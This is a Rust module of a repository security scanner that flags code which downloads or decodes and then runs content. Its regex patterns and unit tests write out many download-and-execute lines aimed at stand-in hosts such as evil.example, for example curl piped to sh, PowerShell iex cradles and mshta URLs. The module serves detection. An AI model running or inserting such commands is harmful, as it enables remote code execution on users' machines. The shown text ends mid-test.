//! Looks for code that behaves dangerously: running what it downloads, or
//! running what it decodes.
//!
//! These read text patterns and don't understand the code, so an honest install
//! script can match too. That is intended: downloading and running code is risky
//! whoever does it, and the report describes the behavior without calling it
//! malware.

use crate::git::RepoFile;
use crate::network::{
    CALL, DECODE, FileClass, LineCounter, classify, host_of, is_binary, is_in_comment, is_local,
    is_reserved_host, nearby_lines, surrounding_line,
};
use crate::report::{At, Kind, Report};
use crate::text::Untrusted;
use regex::bytes::Regex;
use std::sync::LazyLock;

/// A download handed straight to something that runs it.
const PIPED_DOWNLOAD_PATTERN: &str = r#"(?xi-u)
    \b(?:curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod)\b [^\n|]{0,400}
        \| \s* (?:sudo\s+(?:-\w+\s+)*)?
        (?:(?:ba|z|da|k|c|fi)?sh|python[0-9.]*|node|perl|ruby|php|iex|invoke-expression
           |cmd(?:\.exe)?|powershell(?:\.exe)?|pwsh)\b
  | \b(?:ba|z|da)?sh \s+ (?:-c\s+)? ["']? \$\( \s* (?:curl|wget)\b
  | \b(?:ba|z|da)?sh \s+ <\( \s* (?:curl|wget)\b
  | \b(?:iex|invoke-expression) [\s(]*
        (?:iwr|irm|invoke-webrequest|invoke-restmethod|new-object\s+net\.webclient)
  | \bdownloadstring \s* \( [^\n]{0,300} \) \s* \| \s* iex\b
  | \bmshta \s+ https?:
  | \b(?:curl|wget)\b [^\n|]{0,300} \| \s* (?:sudo\s+)? tar\b [^\n]{0,200} (?:&&|;) \s* (?:sudo\s+)? \./
  | \b(?:pip3?|npm|pnpm|yarn|bun|gem)\s+(?:install|add|i)\b [^\n|;&]{0,120}
        \s (?:https?://|git\+|github:) [^\s"']*
  | \bimport \s* \( \s* ["'`] https?://
"#;

/// Encoded text decoded and handed straight to a shell, or a shell started with
/// its command already encoded.
const PIPED_DECODE_PATTERN: &str = r"(?xi-u)
    \b(?:base64\s+(?:-d|-D|--decode)|xxd\s+-r) [^\n|]{0,200}
        \| \s* (?:sudo\s+)? (?:ba|z|da)?sh\b
  | \b(?:powershell|pwsh)(?:\.exe)?\b [^\n]{0,120} \s-e(?:nc|ncodedcommand|c)?\s+ [A-Za-z0-9+/=]{16,}
";

/// Things that run a string as code. Calls on other objects, such as PyTorch's
/// `model.eval()`, are skipped by requiring no dot before the name.
const RUNS_TEXT_PATTERN: &str = r#"(?mxi-u)
    (?:^|[^.\w$\n]) eval \s* \(
  | \( \s* 0 \s* , \s* eval \s* \) \s* \(
  | \.constructor\.constructor \s* \(
  | \[ \s* ["']eval["'] \s* \] \s* \(
  | \b(?:window|globalthis|global|self)\.eval \s* \(
  | \bnew \s+ function \s* \(
  | (?:^|[^.\w$\n]) function \s* \( \s* ["'][^"']{0,40}["'] \s* ,
  | \bvm\.(?:runinthiscontext|runinnewcontext|runincontext|script) \s* \(
  | \bmodule\._compile \s* \(
  | (?:^|[^.\w$\n]) exec \s* \(
  | (?:^|[^.\w$\n]) execscript \s* \(
"#;

/// Running the answer to a web request. The request itself can be far away, or
/// in another file, but only downloaded text is called things like this.
const RUNS_RESPONSE_PATTERN: &str = r#"(?mxi-u)
    (?:(?:^|[^.\w$\n]) (?:eval|exec|function) | \bnew \s+ function | \bvm\.\w+ )
    \s* \( \s* (?:await\s+)?
    ([\w$]+) (?:\.[\w$]+){0,4} \. (?:data|body|text|content|cookie|payload|response|responsetext)
    \b
"#;

/// Other ways to run something, which only matter here beside decoding.
const RUNS_PROGRAM_PATTERN: &str = r#"(?xi-u)
    \brequire \s* \(
  | \bimport \s* \(
  | \bos\.(?:system|popen) \s* \(
  | \bsubprocess\.\w+ \s* \(
  | \b(?:execsync|spawn|spawnsync|execfile|execfilesync|shell_exec|passthru|popen|proc_open) \s* \(
  | \bchild_process\b
  | (?:^|[^.\w$\n]) system \s* \(
  | (?:^|[^.\w$\n]) assert \s* \(
  | \bcreate_function \s* \(
  | (?:^|[^.\w$\n]) compile \s* \(
  | \binvoke-expression\b
  | \biex\b
  | \[scriptblock\]::create\b
  | \bassembly\.load\b
  | \bprocess\.start\b
  | \bruntime\.getruntime\(\)\.exec\b
  | \b(?:instance|class|module)_eval\b
  | \b(?:ba)?sh \s+ -c\b
"#;

/// Files of these types don't run, so a command that runs one means the file is
/// really code in disguise, as in `node public/fonts/icons.woff2`.
const NOT_CODE: &str = "png|jpe?g|gif|svg|ico|webp|bmp|tiff?|woff2?|ttf|otf|eot|txt|md|csv|log|dat|css|mp3|mp4|wav|pdf|docx?|xlsx?";

static PIPED_DOWNLOAD: LazyLock<Regex> = LazyLock::new(|| compile(PIPED_DOWNLOAD_PATTERN));
static PIPED_DECODE: LazyLock<Regex> = LazyLock::new(|| compile(PIPED_DECODE_PATTERN));
static RUNS_TEXT: LazyLock<Regex> = LazyLock::new(|| compile(RUNS_TEXT_PATTERN));
static RUNS_RESPONSE: LazyLock<Regex> = LazyLock::new(|| compile(RUNS_RESPONSE_PATTERN));
static RUNS_PROGRAM: LazyLock<Regex> = LazyLock::new(|| compile(RUNS_PROGRAM_PATTERN));
static RUNS_NOT_CODE: LazyLock<Regex> = LazyLock::new(|| {
    compile(&format!(
        r#"(?mxi-u)
        (?:^|[\s"'`;&|(=])
        (?:node|nodejs|bun|deno[\ \t]+run|python[0-9.]*|ruby|perl|php|sh|bash|zsh
            |(?:powershell(?:\.exe)?|pwsh)[\ \t]+-file|cscript|wscript|mshta)
        [\ \t]+ ["']? [^\s"'|;&()]+ \.(?:{NOT_CODE}) (?:$|[\s"'|;&])
      | (?:(?:^|[^.\w$\n]) eval | \bnew\s+function | \bvm\.\w+ ) \s* \( [^\n]{{0,80}}
        \bread(?:file|filesync)\b [^\n]{{0,80}} \.(?:{NOT_CODE}) \b
        "#
    ))
});
/// Writing out a file, as part of downloading a program and running it.
static WRITES_FILE: LazyLock<Regex> = LazyLock::new(|| {
    compile(
        r#"(?xi-u)
        \bwritefile(?:sync)?\s*\(
      | \bcreatewritestream\s*\(
      | \burlretrieve\s*\(
      | \bopen\s*\([^)\n]{0,120}["']wb["']
      | \.write_bytes\s*\(
      | \bfile_put_contents\s*\(
      | \bset-content\b
      | \bout-file\b
      | -outfile\b
    "#,
    )
});
/// Starting a program. Alone this means very little, so it's only used here.
static STARTS_PROGRAM: LazyLock<Regex> = LazyLock::new(|| {
    compile(
        r#"(?xi-u)
        \b(?:execsync|spawn|spawnsync|execfile|execfilesync|shell_exec|passthru|popen|proc_open)\s*\(
      | \bos\.(?:system|popen|startfile|exec\w*)\s*\(
      | \bsubprocess\.\w+\s*\(
      | \bchildprocess\.exec\s*\(
      | \bstart-process\b
      | \bprocess\.start\s*\(
      | \bchmod(?:sync)?\s*\(
      | \bexec\s*\(\s*[\w$]+\s*[,)]
    "#,
    )
});
/// Saving a download to a named file, so that a later line can run it.
static SAVES_DOWNLOAD: LazyLock<Regex> = LazyLock::new(|| {
    compile(
        r#"(?xi-u)
        \b(?:curl|wget|iwr|invoke-webrequest)\b [^\n|;&]{0,300}?
        \s (?:--output-document|--output|-outfile|-[a-z]*o|>) \s* ["']?
        ([^\s"'|;&<>]+)
    "#,
    )
});
static WGET_DEFAULT_NAME: LazyLock<Regex> = LazyLock::new(|| {
    compile(
        r#"(?i-u)\b(?:wget(?:\s+-[\w-]+)*|curl\s+(?:-[\w-]+\s+)*-[a-z]*O[a-z]*)\s+["']?https?://[^\s"']*/([\w.-]+)"#,
    )
});

fn compile(pattern: &str) -> Regex {
    Regex::new(pattern).expect("patterns are constants covered by tests")
}

/// How far from a `run this text` call to look for the download it runs. Often a
/// few lines apart, as in `const res = await fetch(u); eval(await res.text())`.
const NEARBY_LINES: usize = 12;
const NEARBY_WINDOW_BYTES: usize = 1200;
const PACKAGE_MANAGERS: [&str; 7] = ["pip", "npm", "pnpm", "yarn", "bun", "gem", "pip3"];
/// How close together downloading, saving and starting a program have to be.
const SAVE_AND_RUN_LINES: usize = 8;
const SAVE_AND_RUN_BYTES: usize = 800;
/// How far past a download to look for the command that runs it.
const RUNS_DOWNLOAD_LINES: usize = 8;
const RUNS_DOWNLOAD_BYTES: usize = 1200;
/// How far into a call's arguments to look before assuming the worst.
const MAX_ARGUMENT_BYTES: usize = 400;
/// Pages and notes can show a command without anything running it.
const NON_RUNNING_EXTENSIONS: [&str; 5] = ["html", "htm", "xml", "txt", "map"];
/// The commands that would run a file named just after them.
const RUNS_NAMED_FILE: [&str; 21] = [
    "chmod +x",
    "chmod 755",
    "chmod 777",
    "chmod u+x",
    "chmod a+x",
    "sh",
    "bash",
    "zsh",
    "dash",
    "python",
    "python3",
    "node",
    "ruby",
    "perl",
    "php",
    "source",
    "start-process",
    "msiexec /i",
    "dpkg -i",
    "rpm -i",
    "cmd /c",
];

/// Records dangerous behavior in a file. Documentation is skipped, because an
/// install command in a README isn't running anything.
pub fn scan(file: &RepoFile, report: &mut Report) {
    let path = file.path.raw();
    if classify(path) != FileClass::Code || is_binary(&file.contents) {
        return;
    }
    let extension = path.rsplit_once('.').map_or("", |(_, extension)| extension);
    let extension = extension.to_ascii_lowercase();
    if extension == "map" {
        return;
    }

    if !NON_RUNNING_EXTENSIONS.contains(&extension.as_str()) {
        add_piped_downloads(file, report);
        add_saved_downloads(file, report);
    }
    add_matches(file, &PIPED_DECODE, Kind::RunsHiddenCode, report);
    add_responses_being_run(file, report);
    add_matches(file, &RUNS_NOT_CODE, Kind::DisguisedFile, report);
    add_decoded_runs(file, report);
    add_download_save_and_run(file, report);
    scan_text_runners(file, report);
}

/// Code that downloads something, writes it to a file and starts a program, all
/// within a few lines. Any one of those is ordinary, and the three together are
/// what a dropper is.
fn add_download_save_and_run(file: &RepoFile, report: &mut Report) {
    let contents = file.contents.as_slice();
    let mut lines = LineCounter::new(contents, false);

    for found in WRITES_FILE.find_iter(contents) {
        if is_in_comment(contents, found.start(), file.path.raw()) {
            continue;
        }
        let nearby = nearby_lines(
            contents,
            found.start(),
            found.end(),
            SAVE_AND_RUN_LINES,
            SAVE_AND_RUN_BYTES,
        );
        if CALL.is_match(nearby) && STARTS_PROGRAM.is_match(nearby) {
            let snippet = snippet(contents, found.start(), found.end());
            let line = lines.line_at(found.start());
            report.add(
                Kind::DownloadsAndRuns,
                "",
                snippet.raw(),
                Some(At {
                    path: &file.path,
                    line,
                }),
            );
        }
    }
}

fn add_matches(file: &RepoFile, pattern: &Regex, kind: Kind, report: &mut Report) {
    let contents = file.contents.as_slice();
    let mut lines = LineCounter::new(contents, false);

    for found in pattern.find_iter(contents) {
        if is_in_comment(contents, found.start(), file.path.raw()) {
            continue;
        }
        let snippet = snippet(contents, found.start(), found.end());
        let line = lines.line_at(found.start());
        report.add(
            kind,
            "",
            snippet.raw(),
            Some(At {
                path: &file.path,
                line,
            }),
        );
    }
}

/// `curl x | python -c '...'` runs the code given there and only reads the
/// download. `curl x | bash -s` really does run it, and so does a bare `python`.
fn add_piped_downloads(file: &RepoFile, report: &mut Report) {
    let contents = file.contents.as_slice();
    let mut lines = LineCounter::new(contents, false);

    for found in PIPED_DOWNLOAD.find_iter(contents) {
        let after = contents[found.end()..].trim_ascii_start();
        let flags = after.strip_prefix(b"-").map_or(&[][..], |rest| {
            let end = rest
                .iter()
                .position(|byte| !byte.is_ascii_alphabetic())
                .unwrap_or(rest.len());
            &rest[..end]
        });
        let gets_its_code_elsewhere = flags
            .iter()
            .any(|flag| matches!(flag, b'c' | b'e' | b'n' | b'p' | b'r'));
        if gets_its_code_elsewhere
            || is_in_comment(contents, found.start(), file.path.raw())
            || (found.as_bytes().ends_with(b"://") && points_nowhere_real(after))
            || installs_from_nowhere_real(found.as_bytes())
        {
            continue;
        }

        let snippet = snippet(contents, found.start(), found.end());
        let line = lines.line_at(found.start());
        report.add(
            Kind::DownloadsAndRuns,
            "",
            snippet.raw(),
            Some(At {
                path: &file.path,
                line,
            }),
        );
    }
}

/// `import('http://localhost:3000/a.js')` isn't downloading anything from outside,
/// and nobody can be at a reserved name like `cdn.example.com`. The real host is
/// worked out carefully, since `example.com@evil.net` really means `evil.net`.
fn points_nowhere_real(address: &[u8]) -> bool {
    let end = address
        .iter()
        .position(|byte| byte.is_ascii_whitespace() || matches!(byte, b'"' | b'\'' | b'`'))
        .unwrap_or(address.len());
    let Ok(address) = std::str::from_utf8(&address[..end]) else {
        return false;
    };
    // These can make an address mean something else to whatever finally reads it.
    if address.contains(['\\', '$', '%']) {
        return false;
    }
    host_of(&format!("https://{address}"))
        .is_some_and(|host| is_local(&host) || is_reserved_host(&host))
}

/// `pnpm install x --registry http://localhost:4873/` uses this computer's own copy.
fn installs_from_nowhere_real(found: &[u8]) -> bool {
    let is_install = PACKAGE_MANAGERS.iter().any(|manager| {
        found.len() > manager.len()
            && found[..manager.len()].eq_ignore_ascii_case(manager.as_bytes())
    });
    let address = found
        .windows(3)
        .rposition(|window| window == b"://")
        .map(|at| &found[at + 3..]);

    is_install && address.is_some_and(points_nowhere_real)
}

/// `document.body` and the like aren't the answer to a web request.
fn add_responses_being_run(file: &RepoFile, report: &mut Report) {
    let contents = file.contents.as_slice();
    let mut lines = LineCounter::new(contents, false);

    for captures in RUNS_RESPONSE.captures_iter(contents) {
        let (Some(whole), Some(object)) = (captures.get(0), captures.get(1)) else {
            continue;
        };
        let is_page = [&b"document"[..], b"window", b"self"].contains(&object.as_bytes());
        if is_page || is_in_comment(contents, whole.start(), file.path.raw()) {
            continue;
        }
        let snippet = snippet(contents, whole.start(), whole.end());
        let line = lines.line_at(whole.start());
        report.add(
            Kind::DownloadsAndRuns,
            "",
            snippet.raw(),
            Some(At {
                path: &file.path,
                line,
            }),
        );
    }
}

/// `curl -o x https://a && chmod +x x && ./x` is a pipe to a shell in slow motion.
fn add_saved_downloads(file: &RepoFile, report: &mut Report) {
    let contents = file.contents.as_slice();

    for pattern in [&*SAVES_DOWNLOAD, &*WGET_DEFAULT_NAME] {
        let mut lines = LineCounter::new(contents, false);
        for captures in pattern.captures_iter(contents) {
            let (Some(whole), Some(name)) = (captures.get(0), captures.get(1)) else {
                continue;
            };
            let name = name.as_bytes();
            if name.starts_with(b"-") || is_in_comment(contents, whole.start(), file.path.raw()) {
                continue;
            }
            let window = lines_after(contents, whole.end());
            if runs_file(window, name) {
                let snippet = snippet(contents, whole.start(), whole.end());
                let line = lines.line_at(whole.start());
                report.add(
                    Kind::DownloadsAndRuns,
                    "",
                    snippet.raw(),
                    Some(At {
                        path: &file.path,
                        line,
                    }),
                );
            }
        }
    }
}

/// The rest of this line and a few more.
fn lines_after(contents: &[u8], start: usize) -> &[u8] {
    let limit = (start + RUNS_DOWNLOAD_BYTES).min(contents.len());
    let window = &contents[start..limit];
    let end = window
        .iter()
        .enumerate()
        .filter(|(_, byte)| **byte == b'\n')
        .nth(RUNS_DOWNLOAD_LINES)
        .map_or(window.len(), |(at, _)| at);
    &window[..end]
}

/// Whether text goes on to run a file with this name.
fn runs_file(text: &[u8], name: &[u8]) -> bool {
    let mut from = 0;
    while let Some(at) = find(&text[from..], name) {
        let start = from + at;
        from = start + name.len();

        let before = text[..start].trim_ascii_end();
        let before = before
            .strip_suffix(b"\"")
            .or_else(|| before.strip_suffix(b"'"))
            .unwrap_or(before)
            .trim_ascii_end();

        let ran_by_path = text[..start].ends_with(b"./");
        let ran_by_name = RUNS_NAMED_FILE.iter().any(|command| {
            let command = command.as_bytes();
            before.len() >= command.len() && {
                let tail = &before[before.len() - command.len()..];
                let starts_word = before.len() == command.len()
                    || !before[before.len() - command.len() - 1].is_ascii_alphanumeric();
                tail.eq_ignore_ascii_case(command) && starts_word
            }
        });
        // A path on its own at the start of a command runs that file.
        let at_command_start = name.contains(&b'/')
            && before
                .last()
                .is_none_or(|byte| matches!(byte, b'\n' | b'&' | b';' | b'|'));

        if ran_by_path || ran_by_name || at_command_start {
            return true;
        }
    }
    false
}

fn find(text: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() {
        return None;
    }
    text.windows(needle.len())
        .position(|window| window == needle)
}

/// Running what was just decoded, by whatever means.
fn add_decoded_runs(file: &RepoFile, report: &mut Report) {
    let contents = file.contents.as_slice();
    let mut lines = LineCounter::new(contents, false);

    for found in RUNS_PROGRAM.find_iter(contents) {
        let same_line = surrounding_line(contents, found.start(), found.end());
        if !DECODE.is_match(same_line) || is_in_comment(contents, found.start(), file.path.raw()) {
            continue;
        }
        let snippet = snippet(contents, found.start(), found.end());
        let line = lines.line_at(found.start());
        report.add(
            Kind::RunsHiddenCode,
            "",
            snippet.raw(),
            Some(At {
                path: &file.path,
                line,
            }),
        );
    }
}

fn scan_text_runners(file: &RepoFile, report: &mut Report) {
    let contents = file.contents.as_slice();
    let mut lines = LineCounter::new(contents, false);

    for found in RUNS_TEXT.find_iter(contents) {
        let arguments = &contents[found.end()..];
        // Only `new Function` takes its code in more than the first argument.
        let is_constructor = found
            .as_bytes()
            .to_ascii_lowercase()
            .windows(8)
            .any(|window| window == b"function");
        if is_harmless_function_constructor(arguments)
            || !has_changing_argument(arguments, !is_constructor)
            || is_definition(contents, found.start(), arguments)
            || is_in_comment(contents, found.start(), file.path.raw())
            || is_stack_trace(contents, found.start())
        {
            continue;
        }

        let same_line = surrounding_line(contents, found.start(), found.end());
        let nearby = nearby_lines(
            contents,
            found.start(),
            found.end(),
            NEARBY_LINES,
            NEARBY_WINDOW_BYTES,
        );
        let decodes = DECODE.is_match(same_line);
        let is_exec = found.as_bytes().trim_ascii_start().len() >= 4
            && found
                .as_bytes()
                .windows(4)
                .any(|window| window.eq_ignore_ascii_case(b"exec"))
            && !found
                .as_bytes()
                .windows(10)
                .any(|window| window.eq_ignore_ascii_case(b"execscript"));
        // `exec` usually starts a program rather than running text, so it takes
        // more to show that it's running what came back from a download.
        let downloads = if is_exec {
            !starts_with_quote(arguments)
                && (CALL.is_match(same_line) || assigned_from_download(nearby, arguments))
        } else {
            CALL.is_match(nearby)
        };
        if !decodes && !downloads {
            continue;
        }

        let snippet = snippet(contents, found.start(), found.end());
        let line = lines.line_at(found.start());
        let at = Some(At {
            path: &file.path,
            line,
        });
        if decodes {
            report.add(Kind::RunsHiddenCode, "", snippet.raw(), at);
        }
        if downloads {
            report.add(Kind::DownloadsAndRuns, "", snippet.raw(), at);
        }
    }
}

fn starts_with_quote(arguments: &[u8]) -> bool {
    matches!(
        arguments.trim_ascii_start().first(),
        Some(b'"' | b'\'' | b'`')
    )
}

/// Whether the argument is a variable set from a download a few lines earlier, as
/// in `code = requests.get(u).text` then `exec(code)`.
fn assigned_from_download(nearby: &[u8], arguments: &[u8]) -> bool {
    let arguments = arguments.trim_ascii_start();
    let length = arguments
        .iter()
        .position(|byte| !(byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'$')))
        .unwrap_or(arguments.len());
    let name = &arguments[..length];
    let is_just_a_name = matches!(
        arguments[length..].trim_ascii_start().first(),
        Some(b')' | b',')
    );
    if name.is_empty() || !is_just_a_name {
        return false;
    }

    nearby.split(|byte| *byte == b'\n').any(|line| {
        let Some(at) = find(line, name) else {
            return false;
        };
        let after = line[at + name.len()..].trim_ascii_start();
        after
            .strip_prefix(b"=")
            .is_some_and(|value| !value.starts_with(b"=") && CALL.is_match(value))
    })
}

/// Whether a call's arguments can change at run time. Running a fixed string, as
/// in `eval('1 + 1')`, can't be running something that was downloaded.
fn has_changing_argument(arguments: &[u8], only_the_first: bool) -> bool {
    let mut quote = None;
    let mut depth = 0_u32;
    let mut escaped = false;
    let mut previous = 0_u8;

    for byte in arguments.iter().take(MAX_ARGUMENT_BYTES).copied() {
        match quote {
            Some(_) if escaped => escaped = false,
            Some(_) if byte == b'\\' => escaped = true,
            Some(b'`') if byte == b'{' && previous == b'$' => return true,
            Some(open) if byte == open => quote = None,
            Some(_) => {}
            None => match byte {
                b'"' | b'\'' | b'`' => quote = Some(byte),
                b'(' => depth += 1,
                b')' if depth == 0 => return false,
                b')' => depth -= 1,
                b',' if depth == 0 && only_the_first => return false,
                b'\n' | b' ' | b'\t' | b'\r' | b',' | b'+' => {}
                _ => return true,
            },
        }
        previous = byte;
    }
    true
}

/// Whether this declares a function with the name, rather than calling it, as in
/// `pub fn exec(args: &Args)` or `exec(context?: Context): Promise<void>;`.
fn is_definition(contents: &[u8], start: usize, arguments: &[u8]) -> bool {
    let line_start = contents[..start]
        .iter()
        .rposition(|byte| *byte == b'\n')
        .map_or(0, |newline| newline + 1);
    let before = contents[line_start..=start].trim_ascii_end();
    let before = before.strip_suffix(b"(").unwrap_or(before).trim_ascii_end();
    let declares = [&b"fn"[..], b"def", b"function", b"func", b"sub", b"async"]
        .iter()
        .any(|keyword| before.ends_with(keyword));
    if declares {
        return true;
    }

    let length = arguments
        .iter()
        .take(MAX_ARGUMENT_BYTES)
        .position(|byte| !(byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'$')))
        .unwrap_or(0);
    let after_name = arguments[length..].trim_ascii_start();
    // A typed parameter, such as `args: Args` or `args?: Args`.
    length > 0 && (after_name.starts_with(b":") || after_name.starts_with(b"?:"))
}

/// `at eval (file.js:3:13)` is a line of an error message, not a call.
fn is_stack_trace(contents: &[u8], start: usize) -> bool {
    let before = &contents[..=start];
    let before = before[before.len().saturating_sub(8)..].trim_ascii_end();
    before.ends_with(b"at") || contents[start.saturating_sub(4)..start].ends_with(b"at ")
}

/// `new Function("return this")` is a standard way to reach the global object,
/// and bundled libraries are full of it.
fn is_harmless_function_constructor(after_call: &[u8]) -> bool {
    let rest = after_call.trim_ascii_start();
    rest.starts_with(b"\"return this") || rest.starts_with(b"'return this")
}

fn snippet(contents: &[u8], start: usize, end: usize) -> Untrusted {
    Untrusted::from_bytes(surrounding_line(contents, start, end).trim_ascii())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scan_text(path: &str, contents: &[u8]) -> Report {
        let file = RepoFile {
            path: Untrusted::from_bytes(path.as_bytes()),
            contents: contents.to_vec(),
        };
        let mut report = Report::new();
        scan(&file, &mut report);
        report
    }

    #[test]
    fn finds_downloads_piped_into_something_that_runs_them() {
        for line in [
            "curl -fsSL https://evil.example/i.sh | sh",
            "curl https://evil.example/i.sh | bash",
            "curl https://evil.example/i.sh | sudo bash",
            "curl https://evil.example/i.sh | sudo -E bash",
            "wget -qO- https://evil.example/i.sh | sh",
            "curl \"$PAYLOAD_URL\" | sh",
            "curl -s evil.example/x.py | python3",
            "curl -s evil.example/x.js | node",
            "bash <(curl -s https://evil.example/i.sh)",
            "sh -c \"$(curl -fsSL https://evil.example/i.sh)\"",
            "iwr https://evil.example/i.ps1 | iex",
            "irm https://evil.example/i.ps1 | iex",
            "iex (iwr https://evil.example/i.ps1)",
            "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://evil.example/i')",
            "(New-Object Net.WebClient).DownloadString('https://evil.example/i') | iex",
            "mshta https://evil.example/x.hta",
        ] {
            let report = scan_text("install.sh", line.as_bytes());

            assert_eq!(
                report.listed(Kind::DownloadsAndRuns).len(),
                1,
                "input: {line}"
            );
        }
    }

    #[test]
    fn reading_a_download_with_a_one_line_program_is_not_running_it() {
        for line in [
            "curl -s https://a.example/v.json | python3 -c 'import json'",
            "curl -s https://a.example/x | perl -wlne 'print'",
            "curl -s https://a.example/x | node -e 'x'",
            "curl -s https://a.example/x | ruby -e 'x'",
            "curl -s https://a.example/x | php -r 'x'",
        ] {
            let report = scan_text("a.sh", line.as_bytes());

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
        }
    }

    #[test]
    fn a_shell_told_to_read_its_script_from_a_download_still_counts() {
        for line in [
            "curl -s https://a.example/x | bash -s -- --yes",
            "curl -s https://a.example/x | sh -s",
            "curl -s https://a.example/x | python3 -",
        ] {
            let report = scan_text("a.sh", line.as_bytes());

            assert_eq!(report.listed(Kind::DownloadsAndRuns).len(), 1, "{line}");
        }
    }

    #[test]
    fn a_line_break_after_a_program_name_is_not_an_argument() {
        for text in [
            "#!/usr/bin/env node\nconsole.log('ok')",
            "`#!/usr/bin/env node\\nconsole.log(foo);",
        ] {
            let report = scan_text("a.js", text.as_bytes());

            assert!(report.listed(Kind::DisguisedFile).is_empty(), "{text}");
        }
    }

    #[test]
    fn local_files_being_run_are_not_a_download() {
        for line in [
            "exec(f.read(), namespace)",
            "exec(sys.stdin.read())",
            "eval(filepath.read())",
            "value = pickle.loads(base64.b64decode(value))",
        ] {
            let report = scan_text("a.py", line.as_bytes());

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
            assert!(report.listed(Kind::RunsHiddenCode).is_empty(), "{line}");
        }
    }

    #[test]
    fn downloading_without_running_is_not_flagged_here() {
        for line in [
            "curl -fsSL https://example.com/data.json -o data.json",
            "wget https://example.com/archive.tar.gz",
            "curl https://example.com/a | jq .name",
            "curl https://example.com/a | grep sh",
        ] {
            let report = scan_text("fetch-data.sh", line.as_bytes());

            assert!(
                report.listed(Kind::DownloadsAndRuns).is_empty(),
                "input: {line}"
            );
        }
    }

    #[test]
    fn finds_downloads_saved_and_then_run() {
        for text in [
            "curl -o /tmp/x https://evil.example/x && chmod +x /tmp/x && /tmp/x",
            "curl -fsSL https://evil.example/x -o x.sh\nsh x.sh\n",
            "curl -s https://evil.example/x > a.sh; bash a.sh",
            "wget -O setup.py https://evil.example/s\n\npython3 setup.py\n",
            "wget https://evil.example/setup.sh\nchmod +x setup.sh\n./setup.sh\n",
            "curl -O https://evil.example/run.sh\nbash run.sh\n",
            "curl -o \"$tmp\" \"$url\"\nsh \"$tmp\"\n",
            "Invoke-WebRequest $u -OutFile a.msi\nmsiexec /i a.msi\n",
            "Invoke-WebRequest $u -OutFile a.exe; Start-Process a.exe",
        ] {
            let report = scan_text("install.sh", text.as_bytes());

            assert_eq!(report.listed(Kind::DownloadsAndRuns).len(), 1, "{text}");
        }
    }

    #[test]
    fn downloads_saved_and_used_as_data_are_fine() {
        for text in [
            "curl -o a.tar.gz https://example.com/a\ntar xzf a.tar.gz\n",
            "curl -o data.json https://example.com/a\njq . data.json\n",
            "wget -O- https://example.com/a\nsh other.sh\n",
            "curl -o a.sh https://example.com/a\ncat a.sh\n",
        ] {
            let report = scan_text("fetch.sh", text.as_bytes());

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{text}");
        }
    }

    #[test]
    fn finds_code_that_runs_what_it_downloads() {
        for (name, text) in [
            (
                "same line",
                "fetch(u).then(r => r.text()).then(t => eval(t))",
            ),
            (
                "a few lines apart",
                "const res = await axios.get(u);\nconst code = res.data;\neval(code);",
            ),
            (
                "function constructor",
                "const r = await axios.get(u);\nnew Function('require', r.data)(require);",
            ),
            ("python", "exec(requests.get(u).text)"),
            (
                "python, a few lines apart",
                "code = requests.get(u).text\nprint('ok')\nexec(code)\n",
            ),
            (
                "vm module",
                "const r = await fetch(u);\nvm.runInThisContext(await r.text());",
            ),
        ] {
            let report = scan_text("a.js", text.as_bytes());

            assert_eq!(report.listed(Kind::DownloadsAndRuns).len(), 1, "{name}");
        }
    }

    #[test]
    fn finds_code_that_downloads_saves_and_starts_a_program() {
        for text in [
            "const r = await axios.get(u);\nfs.writeFileSync(p, r.data);\nspawn(p, []);",
            "urllib.request.urlretrieve(u, p)\nos.system(p)\n",
            "r = requests.get(u)\nwith open(p, 'wb') as f:\n  f.write(r.content)\nsubprocess.run([p])\n",
            "Invoke-WebRequest $u -OutFile $p\nStart-Process $p\n",
            "const r = await fetch(u);\nfs.writeFileSync(p, b);\nfs.chmodSync(p, 0o755);\nexec(p);",
        ] {
            let report = scan_text("a.js", text.as_bytes());

            assert!(!report.listed(Kind::DownloadsAndRuns).is_empty(), "{text}");
        }
    }

    #[test]
    fn saving_a_download_without_starting_anything_is_fine() {
        for text in [
            "const r = await axios.get(u);\nfs.writeFileSync(p, r.data);\n",
            "fs.writeFileSync(p, data);\nspawn(p, []);\n",
            "const r = await fetch(u);\nspawn(p, []);\n",
        ] {
            let report = scan_text("a.js", text.as_bytes());

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{text}");
        }
    }

    #[test]
    fn finds_packages_installed_directly_from_an_address() {
        for line in [
            "pip install https://evil.net/a.whl",
            "pip3 install git+https://evil.net/a.git",
            "npm install https://evil.net/a.tgz",
            "pnpm install x --registry https://evil.net/",
            "npm i github:evil/a",
            "yarn add https://evil.net/a.tgz",
            "curl -s https://evil.example/a.tgz | tar xz && ./a/run",
            "await import('https://evil.net/a.js')",
        ] {
            let report = scan_text("a.sh", line.as_bytes());

            assert!(!report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
        }
    }

    #[test]
    fn importing_from_this_computer_is_not_a_download() {
        for line in [
            "await import('http://localhost:4545/a.js')",
            "await import(\"http://127.0.0.1:3000/a.js\")",
            "await import('https://cdn.example.com/a.js')",
        ] {
            let report = scan_text("a.js", line.as_bytes());

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
        }
    }

    #[test]
    fn installing_from_this_computer_is_not_a_download() {
        for line in [
            "pnpm install x --registry http://localhost:4873/",
            "npm install http://127.0.0.1:8080/a.tgz",
            "pip install https://example.com/a.whl",
        ] {
            let report = scan_text("a.ts", line.as_bytes());

            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
        }
    }

    #[test]
    fn a_shell_running_a_download_counts_whatever_the_address() {
        let report = scan_text("a.sh", b"curl https://example.com/i.sh | sh\n");

        assert_eq!(report.listed(Kind::DownloadsAndRuns).len(), 1);
    }

    #[test]
    fn an_import_made_to_look_reserved_still_counts() {
        for line in [
            "await import('https://evilexample.com/a.js')",
            "await import('https://example.com@evil.net/a.js')",
            "await import('https://example.com.evil.net/a.js')",
            "await import('https://evil.net#.example.com')",
            "await import('https://evil.net?.example.com')",
            "await import('https://evil.net\\\\@example.com/a.js')",
